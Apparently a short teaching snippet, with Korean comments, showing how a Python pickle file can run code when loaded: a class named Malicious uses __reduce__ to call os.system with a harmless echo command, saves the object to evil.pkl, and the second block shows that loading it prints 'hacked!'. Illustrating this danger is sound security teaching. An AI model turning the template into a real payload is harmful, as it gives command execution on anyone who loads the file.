```
import pickle
import os

class Malicious:
    def __reduce__(self):
        return (os.system, ("echo hacked!",))

# 저장
pickle.dump(Malicious(), open("evil.pkl", "wb"))
```

```
# 다른 사람이 로드하면
pickle.load(open("evil.pkl", "rb"))  # "hacked!" 출력됨
```
